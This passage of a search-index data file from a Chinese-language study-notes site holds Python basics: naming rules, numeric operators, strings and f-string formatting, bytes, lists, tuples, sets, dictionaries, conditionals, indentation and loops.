\u5185\u5bb9</code> \u6765\u8fdb\u884c\u7c7b\u578b\u6807\u6ce8\uff09</li> <li>\u53d8\u91cf\u540d<ul> <li>\u53ea\u80fd\u5305\u542b\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u4e0b\u5212\u7ebf\u3001\u4e2d\u6587\uff0c\u4e0d\u80fd\u6709\u7a7a\u683c\u548c\u5176\u5b83\u7b26\u53f7</li> <li>\u53ea\u80fd\u4ee5\u5b57\u6bcd\u3001\u4e0b\u5212\u7ebf\u5f00\u5934\uff0c\u4e0d\u80fd\u4ee5\u6570\u5b57\u5f00\u5934\uff0c\u800c\u4e14\u5927\u5c0f\u5199\u654f\u611f</li> <li>\u4e0d\u80fd\u7528\u5173\u952e\u5b57\uff08\u4f8b\u5982 if def \u7b49\uff09\u4f5c\u4e3a\u53d8\u91cf\u540d\uff0c\u4e0d\u63a8\u8350\u4f7f\u7528\u5185\u7f6e\u51fd\u6570\u540d\u4f5c\u4e3a\u53d8\u91cf\u540d</li> <li>\u6e05\u6670\u660e\u786e\u3001\u98ce\u683c\u7edf\u4e00</li> <li>\u5168\u5927\u5199\u4e00\u822c\u8868\u793a\u5e38\u91cf\u3001\u4e0d\u5efa\u8bae\u4f7f\u7528\u53cc\u4e0b\u5212\u7ebf\u5f00\u5934\u6216\u8005\u5f00\u5934\u7ed3\u5c3e\u3001\u4e0d\u5efa\u8bae\u4f7f\u7528 _ \u4f5c\u4e3a\u53d8\u91cf\u540d</li> </ul> </li> </ul>"},{"location":"cs/pl/python/basic/#_2","title":"\u6570\u636e\u7c7b\u578b","text":""},{"location":"cs/pl/python/basic/#_3","title":"\u6570\u5b57\u4e0e\u8fd0\u7b97","text":"<ul> <li>1 \u662f\u6574\u6570\uff0c1. \u662f\u6d6e\u70b9\u6570</li> <li>\u6574\u6570\u4e0e\u6d6e\u70b9\u6570\u8f6c\u6362<ul> <li>int(...)\uff1a\u5411 0 \u820d\u5165</li> <li>round(...)\uff1a\u5411\u5076\u820d\u5165\uff08\u56db\u820d\u516d\u5165\u4e94\u51d1\u5076\uff0c\u53ef\u4ee5\u5f53\u6210\u56db\u820d\u4e94\u5165\uff09</li> <li>math.floor(...)\u3001math.ceil(...)\uff1a\u4e0b\u53d6\u6574\u3001\u4e0a\u53d6\u6574\uff08\u9700\u8981 import math\uff09</li> </ul> </li> <li>\u8fd0\u7b97<ul> <li>+ - * \u52a0\u51cf\u4e58\uff0c\u5de6\u53f3\u90fd\u662f\u6574\u6570\u7ed3\u679c\u4e5f\u662f\u6574\u6570\uff0c\u6709\u6d6e\u70b9\u6570\u7ed3\u679c\u5c31\u662f\u6d6e\u70b9\u6570</li> <li>/ \u9664\u6cd5\uff0c\u7ed3\u679c\u662f\u6d6e\u70b9\u6570\uff08\u5373\u4f7f\u53ef\u4ee5\u6574\u9664\uff09</li> <li>// \u6574\u9664\uff0c\u7ed3\u679c\u662f\u6574\u6570\uff0c\u5411\u4e0b\u53d6\u6574</li> <li>% \u53d6\u6a21\uff0ca % b == a - (a//b)*b\uff08\u548c c \u7684\u884c\u4e3a\u4e0d\u4e00\u81f4\uff09</li> <li>** \u4e58\u65b9\uff0c\u53ef\u4ee5\u662f\u6d6e\u70b9\u6570\uff0c\u6bd4\u5982 a ** 0.5 \u8868\u793a\u5f00\u6839\u53f7</li> <li>pow(a, b, mod)\uff1a\u4e5f\u662f\u4e58\u65b9\uff0cmod \u53ef\u4ee5\u7701\u7565\uff0c\u5982\u679c\u6709 mod \u5219\u5bf9\u7ed3\u679c\u53d6\u6a21\uff0c\u5982\u679c mod \u4e3a -1 \u5219\u8ba1\u7b97\u4e58\u6cd5\u9006\u5143</li> <li>\u66f4\u591a\u8fd0\u7b97\u901a\u8fc7 math\u3001numpy\u3001scipy \u7b49\u5305\u6765\u8fdb\u884c</li> </ul> </li> </ul>"},{"location":"cs/pl/python/basic/#_4","title":"\u590d\u6570\u7c7b\u578b","text":"<ul> <li>python \u4e2d\u5185\u7f6e\u4e86\u590d\u6570\u7c7b\u578b\uff0c1+2j \u5f62\u5f0f\u5c31\u8868\u793a\u4e00\u4e2a\u590d\u6570\uff0c\u5176\u4e2d j \u5373\u865a\u6570\u5355\u4f4d i</li> <li>\u6216\u8005\u4f7f\u7528 complex(\u5b9e\u90e8, \u865a\u90e8) \u5f62\u5f0f\u5b9a\u4e49\u590d\u6570</li> <li>\u53ef\u4ee5\u8fdb\u884c\u590d\u6570\u7684\u52a0\u51cf\u4e58\u9664\u8fd0\u7b97</li> <li>\u5c5e\u6027\u4e0e\u65b9\u6cd5<ul> <li>c.real\uff1a\u5b9e\u90e8</li> <li>c.imag\uff1a\u865a\u90e8</li> <li>c.conjugate()\uff1a\u8fd4\u56de\u5171\u8f6d\u590d\u6570</li> </ul> </li> </ul>"},{"location":"cs/pl/python/basic/#_5","title":"\u5b57\u7b26\u4e32","text":"<ul> <li>\u5355\u5f15\u53f7 '...'\uff0c\u53cc\u5f15\u53f7 \"...\"\uff0c\u4e09\u5f15\u53f7 '''...''' \"\"\"...\"\"\"\uff08\u53ef\u4ee5\u5185\u90e8\u6362\u884c\uff09</li> <li>\\n \u6362\u884c\uff0c\\t \u5236\u8868\u7b26\uff0c\\r \u56de\u8f66\uff0c\\' \u5355\u5f15\u53f7\uff0c\\\" \u53cc\u5f15\u53f7\uff0c\\\\ \u659c\u6760\uff08\u53ea\u6253\u4e00\u4e2a  \u4f1a\u51fa\u95ee\u9898\uff09\uff0c\u2026\u2026</li> <li>\u524d\u7f00<ul> <li>r-string\uff1ar\"...\"\uff0c\u5f15\u53f7\u4e2d\u4e0d\u8fdb\u884c\u8f6c\u4e49\uff0c\u5373\u4e00\u4e2a  \u5c31\u4ee3\u8868\u659c\u6760\u5b57\u7b26\u672c\u8eab</li> <li>f-string\uff1af\"...\"\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32</li> <li>b-string\uff1ab\"...\"\uff0c\u5c06\u5b57\u7b26\u4e32\u8f6c\u4e3a bytes\uff0c\u53ea\u80fd\u5305\u542b ASCII \u5b57\u7b26</li> </ul> </li> <li>\u5e38\u7528\u65b9\u6cd5<ul> <li>\u62fc\u63a5\uff1a\u76f4\u63a5\u5c06\u5b57\u7b26\u4e32\u201c\u76f8\u52a0\u201d</li> <li>\"...\".upper()\u3001\"...\".lower()\uff1a\u8f6c\u4e3a\u5168\u5927\u5199\u3001\u5168\u5c0f\u5199</li> <li>\"...\".title()\uff1a\u5355\u8bcd\u9996\u5b57\u6bcd\u5927\u5199</li> <li>\"...\".strip()\uff1a\u5220\u9664\u5b57\u7b26\u4e32\u9996\u5c3e\u7a7a\u767d\uff08\u5305\u542b\u7a7a\u683c\u548c\u5236\u8868\u7b26\uff09</li> <li>\"...\".lstrip()\u3001\"...\".rstrip()\uff1a\u5220\u9664\u5de6\u3001\u53f3\u7aef\u7a7a\u767d</li> <li>\"...\".split(c)\uff1a\u6839\u636e\u5b57\u7b26 c \u6765\u62c6\u5206\u5b57\u7b26\u4e32\u5f97\u5230\u5217\u8868\uff0c\u9ed8\u8ba4\u62c6\u5206\u7a7a\u767d</li> </ul> </li> </ul>"},{"location":"cs/pl/python/basic/#f-string","title":"f-string","text":"<ul> <li>\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u65b9\u5f0f\uff1a\"...\" % ...\uff0c\"...\".format(...)\uff0cf\"...\"</li> <li>\u5b57\u7b26\u4e32\u5185\u5927\u62ec\u53f7\u62ec\u8d77\u6765\u7684\u8ba1\u7b97\u540e\u8f6c\u4e3a\u5b57\u7b26\u4e32\u586b\u5165 f\"...{...}...\"</li> <li>\u5982\u679c\u5b57\u7b26\u4e32\u8981\u7528\u5927\u62ec\u53f7\u539f\u59cb\u5b57\u7b26\u8981\u5199\u4e24\u4e2a f\"...{{...\"</li> <li>\u683c\u5f0f\u5316\uff08\u5728\u586b\u5165\u5185\u5bb9\u540e\u9762\u52a0\u5192\u53f7 f\"...{\u8868\u8fbe\u5f0f:\u683c\u5f0f}...\"\uff09<ul> <li>\u5bbd\u5ea6\u586b\u5145\uff1a:[\u586b\u5145\u5b57\u7b26][\u5bf9\u9f50\u65b9\u5f0f][\u5bbd\u5ea6]\uff0c&lt; \u5de6\u5bf9\u9f50\uff0c&gt; \u53f3\u5bf9\u9f50\uff0c^ \u5c45\u4e2d</li> <li>\u5b57\u7b26\u622a\u65ad\uff1a:[...].n\uff0c\u53ea\u663e\u793a\u5b57\u7b26\u4e32\u7684\u524d n \u4e2a\u5b57\u7b26</li> <li>\u6570\u503c\u7b26\u53f7\uff1a:+ \u6b63\u6570\u52a0\u6b63\u53f7\u3001\u8d1f\u6570\u52a0\u8d1f\u53f7\uff0c:- \u539f\u6837\uff0c: \uff08\u7a7a\u683c\uff09\u6b63\u6570\u52a0\u7a7a\u683c\u3001\u8d1f\u6570\u52a0\u8d1f\u53f7</li> <li>\u6570\u503c\u7cbe\u5ea6\uff1a:[\u5bbd\u5ea6][\u5206\u9694\u7b26(,_)].[\u7cbe\u5ea6]f\uff0c\u6ca1\u6709\u7cbe\u5ea6\u9ed8\u8ba4\u4e3a 6</li> <li>\u8fdb\u5236\u663e\u793a\uff1ax \u5c0f\u5199\u5341\u516d\u8fdb\u5236\uff0cX \u5927\u5199\u5341\u516d\u8fdb\u5236\uff0co \u516b\u8fdb\u5236\uff0cb \u4e8c\u8fdb\u5236\uff0c\u52a0 # \u663e\u793a\u524d\u7f00</li> </ul> </li> </ul>"},{"location":"cs/pl/python/basic/#_6","title":"\u5b57\u8282\u7c7b\u578b","text":"<ul> <li>\u7c7b\u4f3c\u5b57\u7b26\u4e32\uff0c\u4f46\u5b58\u50a8\u7684\u662f\u5b57\u8282\u7684\u503c\uff0c\u66f4\u50cf\u5217\u8868\uff0c\u663e\u793a\u4e3a b\"...\" \u53ea\u662f\u66f4\u52a0\u6613\u8bfb\u800c\u5df2</li> <li>b\"...\" \u5219\u8868\u793a\u5b57\u8282\u7c7b\u578b\uff0c\u5176\u4e2d\u53ea\u80fd\u5305\u542b ASCII \u5b57\u7b26\u548c \\x.. \u8868\u793a\u7684\u5341\u516d\u8fdb\u5236\u6570</li> <li>\u4e0e\u5b57\u7b26\u4e32\u8f6c\u6362<ul> <li>\"...\".encode(encoding) \u6839\u636e encoding \u7f16\u7801\u5b57\u7b26\u4e32\uff0c\u9ed8\u8ba4 UTF-8</li> <li>bytes_obj.decode(encoding) \u6839\u636e encoding \u89e3\u7801\u5b57\u8282\u5e8f\u5217\uff0c\u89e3\u7801\u5931\u8d25\u4f1a\u62a5\u9519</li> <li>bytes(\"...\", encoding) \u4e5f\u662f\u6839\u636e encoding \u7f16\u7801\u5b57\u7b26\u4e32</li> <li>\u4e0d\u8981\u4f7f\u7528 str(b\"...\") \u6765\u5c06\u5b57\u8282\u5e8f\u5217\u8f6c\u4e3a\u5b57\u7b26\u4e32</li> </ul> </li> </ul>"},{"location":"cs/pl/python/basic/#_7","title":"\u5e03\u5c14\u7c7b\u578b","text":"<ul> <li>True \u548c False\uff0c\u8bb0\u4f4f\u9996\u5b57\u6bcd\u5927\u5199</li> <li>\u7528 bool(...) \u6765\u8f6c\u6362\uff0c\u5982\u679c\u662f\u6570\u5b57\u5219\u975e\u96f6\u90fd\u662f True\uff0c\u5982\u679c\u662f\u5b57\u7b26\u4e32\u5219\u975e\u7a7a\u90fd\u662f True</li> <li>\u8fd0\u7b97<ul> <li>\u53ef\u4ee5\u4f7f\u7528 &amp; | \u6765\u8868\u793a\u4e0e\u548c\u6216\uff08\u4f46\u5e76\u4e0d\u4f1a\u77ed\u8def\uff09</li> <li>\u4e00\u822c\u4f7f\u7528 and or not \u8fdb\u884c\u4e0e/\u6216/\u975e\u8fd0\u7b97\uff08\u4f1a\u77ed\u8def\uff09</li> </ul> </li> </ul>"},{"location":"cs/pl/python/basic/#_8","title":"\u5217\u8868","text":"<ul> <li>\u7c7b\u4f3c\u5176\u5b83\u8bed\u8a00\u7684\u6570\u7ec4\uff0c\u4f46\u662f\u529f\u80fd\u66f4\u591a\uff0c\u800c\u4e14\u5185\u90e8\u5143\u7d20\u4e0d\u8981\u6c42\u540c\u4e00\u7c7b\u578b</li> <li>\u65b9\u62ec\u53f7 [] \u8868\u793a\u5217\u8868\uff0c\u5143\u7d20\u7528\u9017\u53f7\u5206\u9694</li> <li>\u7d22\u5f15\uff08\u5373\u4e0b\u6807\uff09\u4ece 0 \u5f00\u59cb\u8ba1\u6570\uff0clst[n] \u5373\u8868\u793a\u8bbf\u95ee\u7b2c n+1 \u4e2a\u5143\u7d20</li> <li>\u7d22\u5f15\u53ef\u4ee5\u662f\u8d1f\u6570\uff0c\u8d1f\u6570\u5373\u8868\u793a\u5012\u6570\uff0c\u4f8b lst[-2] \u8868\u793a\u5012\u6570\u7b2c\u4e8c\u4e2a\u5143\u7d20</li> <li>\u5207\u7247\uff08\u83b7\u53d6\u5217\u8868\u4e2d\u7684\u4e00\u90e8\u5206\u503c\uff09<ul> <li>lst[a:b]\uff1a\u4ece lst[a] \u5230 lst[b-1] \u7684\u5217\u8868</li> <li>lst[:b]\uff1a\u4ece\u5f00\u5934\u5230 lst[b-1] \u7684\u5217\u8868</li> <li>lst[a:]\uff1a\u4ece lst[a] \u5230\u7ed3\u5c3e\u7684\u5217\u8868</li> <li>lst[:]\uff1a\u8868\u793a\u6574\u4e2a\u5217\u8868\uff08\u62f7\u8d1d\u4e00\u4efd\uff09</li> <li>lst[a:b:c]\uff1a\u4ece lst[a] \u5230 lst[b-1] \u6bcf c \u4e2a\uff08\u5373\u6b65\u957f\uff09\u53d6\u4e00\u4e2a\u5f62\u6210\u7684\u5217\u8868</li> <li>c \u53ef\u4ee5\u662f\u8d1f\u6570\uff0c\u6b64\u65f6\u9700\u8981 a &gt; b \u624d\u80fd\u83b7\u53d6\u5230\u503c</li> <li>\u6709\u6b65\u957f\u65f6\u82e5\u7701\u7565 a\u3001b \u8bb0\u5f97\u4e0d\u8981\u7701\u7565\u5192\u53f7\uff0c\u4f8b lst[::-1] \u8868\u793a\u5217\u8868\u5012\u5e8f</li> </ul> </li> </ul>"},{"location":"cs/pl/python/basic/#_9","title":"\u5217\u8868\u64cd\u4f5c","text":"<ul> <li>\u4fee\u6539\u5143\u7d20\uff1a\u76f4\u63a5\u901a\u8fc7\u7d22\u5f15/\u5207\u7247\uff0c\u7136\u540e\u7b49\u53f7\u8d4b\u503c</li> <li>\u6709\u6808\u7684\u529f\u80fd<ul> <li>lst.append(...) \u5728\u5217\u8868\u672b\u5c3e\u52a0\u5165\u5143\u7d20</li> <li>lst.pop() \u5f39\u51fa\u5217\u8868\u672b\u5c3e\u5143\u7d20\u5e76\u8fd4\u56de</li> </ul> </li> <li>\u4efb\u610f\u4f4d\u7f6e\u63d2\u5165\u5f39\u51fa<ul> <li>lst.insert(i, x) \u5728\u7d22\u5f15 i \u7684\u4f4d\u7f6e\u63d2\u5165 x\uff0c\u540e\u9762\u4f9d\u6b21\u540e\u79fb</li> <li>lst.pop(i) \u5f39\u51fa\u7d22\u5f15 i \u4f4d\u7f6e\u7684\u5143\u7d20\uff0c\u540e\u9762\u4f9d\u6b21\u524d\u79fb</li> </ul> </li> <li>\u5217\u8868\u62fc\u63a5<ul> <li>\u76f4\u63a5\u76f8\u52a0\uff0c\u4e0d\u6539\u53d8\u539f\u5217\u8868\uff0c\u5f97\u5230\u65b0\u7684\u5217\u8868</li> <li>lst.extend([...])\uff0c\u628a\u4e00\u4e2a\u5217\u8868\u63a5\u5230\u5f53\u524d\u5217\u8868\u540e\u9762</li> </ul> </li> <li>\u6839\u636e\u503c\u5220\u9664\u5143\u7d20<ul> <li>lst.remove(value) \u5220\u9664\u7b2c\u4e00\u4e2a\u503c\u4e3a value \u7684\u5143\u7d20</li> </ul> </li> <li>\u6392\u5e8f\u5217\u8868<ul> <li>lst.sort() \u6c38\u4e45\u6392\u5e8f\uff08\u5373\u6392\u5e8f\u540e\u8d4b\u503c\u7ed9\u5f53\u524d\u5217\u8868\uff09</li> <li>sorted(lst) \u4e34\u65f6\u6392\u5e8f\uff0c\u8fd4\u56de\u6392\u5e8f\u597d\u7684\u65b0\u5217\u8868</li> <li>\u9ed8\u8ba4\u4ece\u5c0f\u5230\u5927\uff0c\u5982\u679c\u4f20\u5165 reverse=True \u5219\u4ece\u5927\u5230\u5c0f</li> </ul> </li> <li>\u53cd\u8f6c\u5217\u8868<ul> <li>lst.reverse() \u6c38\u4e45\u53cd\u8f6c\uff08\u610f\u4e49\u540c\u4e0a\uff09</li> <li>lst[::-1] \u8fd4\u56de\u53cd\u8f6c\u7684\u5217\u8868\uff08\u5229\u7528\u524d\u9762\u8bf4\u5230\u7684\u5207\u7247\uff09</li> </ul> </li> <li>\u7edf\u8ba1\u64cd\u4f5c<ul> <li>len(lst) \u5f97\u5230\u5217\u8868\u7684\u957f\u5ea6</li> <li>sum(lst) \u5f97\u5230\u5217\u8868\u7684\u5143\u7d20\u548c\uff08\u672c\u8d28\u4e0a\u662f\u5c06 start \u53c2\u6570\u548c\u6bcf\u4e2a\u5143\u7d20\u4f9d\u6b21\u76f8\u52a0\uff09<ul> <li>\u53ef\u4ee5\u4f20\u5165 start \u53c2\u6570\u7528\u6765\u6307\u5b9a\u52a0\u548c\u7684\u8d77\u59cb\u503c</li> </ul> </li> <li>max(lst) \u5f97\u5230\u5217\u8868\u4e2d\u7684\u6700\u5927\u503c</li> <li>min(lst) \u5f97\u5230\u5217\u8868\u4e2d\u7684\u6700\u5c0f\u503c</li> </ul> </li> </ul>"},{"location":"cs/pl/python/basic/#_10","title":"\u5143\u7ec4","text":"<ul> <li>\u53ef\u4ee5\u770b\u6210\u5143\u7d20\u4e0d\u53ef\u53d8\u7684\u5217\u8868\uff0c\u5185\u90e8\u4e5f\u53ef\u4ee5\u5305\u542b\u4e0d\u540c\u7c7b\u578b\u7684\u5143\u7d20</li> <li>\u62ec\u53f7\u8868\u793a\u5143\u7ec4\uff0c\u5185\u90e8\u5143\u7d20\u95f4\u7528\u9017\u53f7\u5206\u9694</li> <li>\u53ef\u4ee5\u4f7f\u7528\u548c\u5217\u8868\u4e00\u6837\u7684\u65b9\u6cd5\u6765\u8bfb\u53d6\u5143\u7d20\uff0c\u4f46\u5e76\u4e0d\u80fd\u4fee\u6539</li> <li>\u5f53\u53ea\u6709\u4e00\u4e2a\u5143\u7d20\u7684\u65f6\u5019\u8981\u5199\u6210 (a,) \u800c\u4e0d\u662f (a)\uff08\u540e\u8005\u662f\u5355\u4e2a\u503c\uff09</li> <li>\u53ef\u4ee5\u4f7f\u7528 tuple(...) \u6765\u5c06\u53ef\u8fed\u4ee3\u5bf9\u8c61\uff08\u5217\u8868\u3001\u5b57\u7b26\u4e32\u7b49\uff09\u8f6c\u4e3a\u5143\u7ec4</li> <li>\u5143\u7ec4\u5e76\u4e0d\u80fd\u4fdd\u8bc1\u5143\u7d20\u5b8c\u5168\u4e0d\u53ef\u53d8<ul> <li>\u907f\u514d\u5728\u5143\u7ec4\u4e2d\u5b58\u653e\u53ef\u53d8\u5143\u7d20</li> </ul> </li> </ul>"},{"location":"cs/pl/python/basic/#_11","title":"\u96c6\u5408","text":"<ul> <li>\u5927\u62ec\u53f7\u62ec\u8d77\u6765\uff0c\u5185\u90e8\u5143\u7d20\u95f4\u7528\u9017\u53f7\u5206\u9694\uff0c\u4f1a\u81ea\u52a8\u53bb\u91cd</li> <li>\u53ef\u7528 set(...) \u6765\u5c06\u53ef\u8fed\u4ee3\u5bf9\u8c61\u8f6c\u4e3a\u5143\u7ec4\uff0c\u81ea\u52a8\u53bb\u91cd</li> <li>\u96c6\u5408\u4e2d\u4e0d\u80fd\u5305\u542b\u5217\u8868\u7b49\u4e0d\u53ef hash \u5316\u7684\u5143\u7d20</li> <li>\u4fee\u6539<ul> <li>s.add(...) \u6765\u52a0\u5165\u4e00\u4e2a\u5143\u7d20</li> <li>s.remove(...) \u5220\u9664\u4e00\u4e2a\u5143\u7d20\uff0c\u5982\u679c\u6ca1\u6709\u4f1a\u629b\u51fa\u5f02\u5e38</li> <li>s.discard(...) \u6765\u5220\u9664\u4e00\u4e2a\u5143\u7d20\uff0c\u5982\u679c\u6ca1\u6709\u5219\u5ffd\u7565</li> </ul> </li> <li>\u8fd0\u7b97<ul> <li>s1 &amp; s2\u3001s1 | s2\u3001s1 - s2 \u4ea4\u96c6\u3001\u5e76\u96c6\u3001\u5dee\u96c6</li> <li>s1 ^ s2 \u5bf9\u79f0\u5dee\u96c6</li> </ul> </li> </ul>"},{"location":"cs/pl/python/basic/#_12","title":"\u5b57\u5178","text":"<ul> <li>\u5b58\u50a8\u952e\u503c\u5bf9\uff0c\u4e5f\u662f\u5927\u62ec\u53f7\u62ec\u8d77\u6765\uff0c\u4e0d\u8fc7\u9017\u53f7\u5206\u9694\u7684\u662f\u952e\u503c\u5bf9 {key: value, ...}</li> <li>{} \u662f\u7a7a\u5b57\u5178\u800c\u4e0d\u662f\u7a7a\u96c6\u5408</li> <li>\u901a\u8fc7 d[key] \u6765\u8bbf\u95ee\u5b57\u5178\u4e2d key \u5bf9\u5e94\u7684\u503c\uff0c\u53ef\u4ee5\u8bfb\u53d6\u3001\u4fee\u6539</li> <li>\u6dfb\u52a0\u952e\u503c\u5bf9\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 d[key] = value \u6765\u8fdb\u884c</li> <li>\u5220\u9664\u952e\u503c\u5bf9\u53ef\u4ee5\u76f4\u63a5 del d[key]</li> <li>\u901a\u8fc7 d[key] \u8bbf\u95ee\u503c\u65f6\u5982\u679c\u4e0d\u5b58\u5728 key \u8fd9\u4e2a\u952e\u4f1a\u629b\u51fa\u5f02\u5e38<ul> <li>\u901a\u8fc7 d.get(key) \u6765\u8bbf\u95ee\u503c\u65f6\u5982\u679c\u4e0d\u5b58\u5728\u5219\u4f1a\u8fd4\u56de None</li> <li>\u4f7f\u7528 d.get(key, default) \u5982\u679c\u6ca1\u6709 key \u65f6\u4f1a\u8fd4\u56de default \u503c    </li> </ul> </li> <li>d.update(d2) \u6765\u7528 d2 \u4e2d\u7684\u952e\u503c\u5bf9\u66f4\u65b0 d</li> </ul>"},{"location":"cs/pl/python/basic/#_13","title":"\u6761\u4ef6\u5206\u652f","text":""},{"location":"cs/pl/python/basic/#_14","title":"\u5e03\u5c14\u8868\u8fbe\u5f0f","text":"<ul> <li><code>==</code> \u5224\u65ad\u76f8\u7b49\uff08\u76f8\u7b49\u5219\u8fd4\u56de True\uff09\uff0c<code>!=</code> \u5224\u65ad\u4e0d\u7b49</li> <li>\u4f7f\u7528 and or not \u6765\u8fdb\u884c\u5e03\u5c14\u8fd0\u7b97\uff0c\u5fc5\u8981\u65f6\u52a0\u62ec\u53f7\u4fdd\u8bc1\u4f18\u5148\u7ea7</li> <li>\u6570\u503c\u6bd4\u8f83\u5927\u5c0f <code>&lt; &lt;= &gt; &gt;=</code> </li> <li>\u5224\u65ad\u5143\u7d20\u662f\u5426\u5728\u5217\u8868\u4e2d<ul> <li>value in lst\uff1a\u5982\u679c\u5728\u5219\u503c\u4e3a True</li> <li>value not in lst\uff1a\u5982\u679c\u5728\u5219\u4e3a False\uff08\u5224\u65ad\u662f\u5426\u4e0d\u5728\uff09</li> </ul> </li> <li>\u5224\u65ad\u952e\u662f\u5426\u5728\u5b57\u5178\u4e2d<ul> <li>key in d\u3001key not in d \u4e0e\u5217\u8868\u540c\u7406</li> </ul> </li> </ul>"},{"location":"cs/pl/python/basic/#_15","title":"\u6761\u4ef6\u8bed\u53e5","text":"<ul> <li>if-elif-else \u7ed3\u6784\uff08\u4e0d\u662f else if\uff09</li> <li>elif\u3001else \u5747\u53ef\u4ee5\u7701\u7565</li> <li>\u6761\u4ef6\u4e0d\u9700\u8981\u52a0\u62ec\u53f7\uff08\u52a0\u4e86\u4e5f\u6ca1\u95ee\u9898\uff09</li> <li>condition \u4f1a\u88ab\u8f6c\u6362\u6210 bool \u7c7b\u578b\u7136\u540e\u5224\u65ad</li> <li>\u6ce8\u610f\u7f29\u8fdb</li> <li>\u7c7b\u4e09\u76ee\u8fd0\u7b97\u7b26\u5199\u6cd5 a if condition else b<ul> <li>\u7c7b\u4f3c\u5176\u5b83\u8bed\u8a00\u4e2d\u7684 condition? a : b</li> </ul> </li> </ul> <pre><code>if condition1:\n    ...\nelif condition2:\n    ...\nelif condition3:\n    ...\nelse:\n    ...\n</code></pre>"},{"location":"cs/pl/python/basic/#_16","title":"\u7f29\u8fdb","text":"<ul> <li>\u7f29\u8fdb\u662f python \u4e2d\u5f88\u91cd\u8981\u7684\u4e1c\u897f\uff0cpython \u9760\u7f29\u8fdb\u6765\u5f97\u5230\u4ee3\u7801\u7ed3\u6784\uff0c\u800c\u4e0d\u662f\u5927\u62ec\u53f7</li> <li>\u7f29\u8fdb\u53ef\u4ee5\u4f7f\u7528\u7a7a\u683c\u6216\u5236\u8868\u7b26</li> <li>\u5982\u679c\u4e00\u4e9b\u4ee3\u7801\u5904\u4e8e\u540c\u4e00\u5c42\u7f29\u8fdb\u4e0b\uff0c\u5219\u5c5e\u4e8e\u540c\u4e00\u4e2a\u4ee3\u7801\u5757</li> <li>\u540c\u4e00\u4e2a\u4ee3\u7801\u5757\u7684\u7f29\u8fdb\u8981\u7edf\u4e00<ul> <li>\u4e0d\u4ec5\u4ec5\u662f\u770b\u7740\u50cf\uff0c\u8981\u533a\u5206\u597d\u7a7a\u683c\u4e0e\u5236\u8868\u7b26</li> <li>4 \u4e2a\u7a7a\u683c\u4e0e\u4e00\u4e2a\u663e\u793a\u5bbd\u5ea6\u4e3a 4 \u7684\u5236\u8868\u7b26\u5e76\u4e0d\u662f\u540c\u4e00\u7f29\u8fdb</li> </ul> </li> <li>\u4e00\u822c\u4f7f\u7528 4 \u7a7a\u683c\u7f29\u8fdb\uff0c\u6216\u8005 1 \u5236\u8868\u7b26\u7f29\u8fdb</li> <li>\u7f16\u8f91\u5668\u4e2d\u6309 Tab \u6253\u51fa\u7684\u4e5f\u4e0d\u4e00\u5b9a\u662f\u5236\u8868\u7b26\uff0c\u8981\u5206\u6e05</li> <li>\u7f29\u8fdb\u4e0d\u6b63\u786e\u4f1a\u62a5 IndentationError\uff0c\u6b64\u65f6\u6ce8\u610f\u68c0\u67e5\u7f29\u8fdb</li> </ul>"},{"location":"cs/pl/python/basic/#_17","title":"\u5faa\u73af","text":""},{"location":"cs/pl/python/basic/#for","title":"for \u5faa\u73af","text":"<ul> <li>python \u4e2d\u7684 for \u5faa\u73af\u5e76\u4e0d\u50cf c \u4e2d\u662f\u6307\u5b9a\u4e00\u4e2a\u53d8\u91cf\u7684\u53d8\u5316\u65b9\u5f0f\uff0c\u800c\u662f\u4ece\u5217\u8868/\u5143\u7ec4/\u8fed\u4ee3\u5668\u7b49\u53ef\u8fed\u4ee3\u5bf9\u8c61\u4e2d\u904d\u5386\u503c</li> <li>for \u5faa\u73af\u4f1a\u4ea7\u751f\u4e00\u4e2a\u7528\u4e8e\u5faa\u73af\u7684\u53d8\u91cf\uff0c\u8fd9\u4e2a\u53d8\u91cf\u5728\u5faa\u73af\u7ed3\u675f\u540e\u5e76\u4e0d\u4f1a\u5220\u9664\uff0c\u800c\u662f\u4fdd\u7559\u6700\u540e\u4e00\u6b21\u7684\u503c</li> <li>\u53ef\u4ee5\u4f7f\u7528 range \u6765\u751f\u6210\u4e00\u4e32\u6570\u5b57\u7528\u6765\u5faa\u73af<ul> <li>range(a, b) \u751f\u6210\u4ece a \u5230 b-1 \u7684\u8fde\u7eed\u6574\u6570</li> <li>range(a, b, c) \u4ee5 c \u4e3a\u6b65\u957f\u751f\u6210</li> <li>range \u5f97\u5230\u7684\u5e76\u4e0d\u662f\u5217\u8868\uff0c\u5982\u679c\u8981\u7528\u5176\u751f\u6210\u5217\u8868\u8981\u4f7f\u7528 list(range(...))</li> </ul> </li> </ul> <pre><code>for value in lst:\n    ...\n\nfor value in range(...):\n    ...\n</code></pre>"},{"location":"cs/pl/python/basic/#for_1","title":"for \u5faa\u73af\u904d\u5386\u5b57\u5178","text":"<ul> <li>\u6709\u4e09\u79cd\u65b9\u6cd5\u6765\u904d\u5386\u5b57\u5178</li> <li>\u5728 d.keys() \u4e2d\u5faa\u73af\u904d\u5386\u6240\u6709\u952e</li> <li>\u5728 d.values() \u4e2d\u5faa\u73af\u904d\u5386\u6240\u6709\u503c</li> <li>\u5728 d.items() \u4e2d\u904d\u5386\u952e\u503c\u5bf9\uff08\u9700\u8981\u89e3\u5305\uff09</li> </ul> <pre><code>for key in d.keys():\n    ...\n\nfor value in d.values():\n    ...\n\nfor item in d.items():\n    ... # item \u4e3a\u4e00\u4e2a\u5143\u7ec4\n\nfor key, value in d.items():\n    ... # \u5c06 item \u89e3\u5305\n</code></pre>"},{"location":"cs/pl/python/basic/#_18","title":"\u5143\u7d20\u89e3\u5305","text":"<ul> <li>\u8d4b\u503c\u65f6\u7b49\u53f7\u5de6\u4fa7\u53ef\u4ee5\u662f\u7528\u9017\u53f7\u5206\u9694\u7684\u591a\u4e2a\u503c\uff0c\u8fd9\u65f6\u4f1a\u5c06\u53f3\u4fa7\u89e3\u5305\u5206\u522b\u8d4b\u503c\u7ed9\u5de6\u4fa7\u7684\u5404\u4e2a\u53d8\u91cf</li> <li>\u53f3\u4fa7\u4e5f\u53ef\u4ee5\u662f\u591a\u4e2a\u503c\uff08\u53ea\u8981\u51fa\u73b0\u9017\u53f7\u5c31\u4f1a\u89c6\u4e3a\u4e00\u4e2a\u5143\u7ec4\uff09<ul> <li>\u53ef\u4ee5\u901a\u8fc7 a, b = b, a \u5b9e\u73b0\u5143\u7d20\u4ea4\u6362</li> </ul> </li> 